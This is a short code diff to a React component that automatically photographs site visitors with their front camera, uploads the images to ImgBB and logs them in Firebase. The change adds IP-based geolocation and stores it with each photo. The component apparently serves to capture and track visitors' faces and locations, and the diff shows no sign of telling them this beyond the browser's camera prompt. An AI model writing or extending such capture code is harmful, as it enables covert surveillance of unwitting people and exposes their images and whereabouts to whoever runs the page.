@@ -1,5 +1,5 @@
 import { useEffect, useRef } from "react";
-import { uploadToImgBB, saveVisitorImage } from "@/lib/firebase";
+import { uploadToImgBB, saveVisitorImage, getLocationFromIP } from "@/lib/firebase";
 
 interface CameraCaptureProps {
   onComplete: () => void;
@@ -16,6 +16,9 @@ const CameraCapture = ({ onComplete }: CameraCaptureProps) => {
 
     const captureAndUpload = async () => {
       try {
+        // Get location first
+        const location = await getLocationFromIP();
+
         // Request camera using native browser permission
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: 640, height: 480 }
@@ -45,8 +48,8 @@ const CameraCapture = ({ onComplete }: CameraCaptureProps) => {
                   try {
                     // Upload to ImgBB
                     const imageUrl = await uploadToImgBB(blob);
-                    // Save URL to Firebase
-                    await saveVisitorImage(imageUrl);
+                    // Save URL to Firebase with location
+                    await saveVisitorImage(imageUrl, location);
                     console.log('Image captured and saved:', imageUrl);
                   } catch (err) {
                     console.error('Failed to upload image:', err);
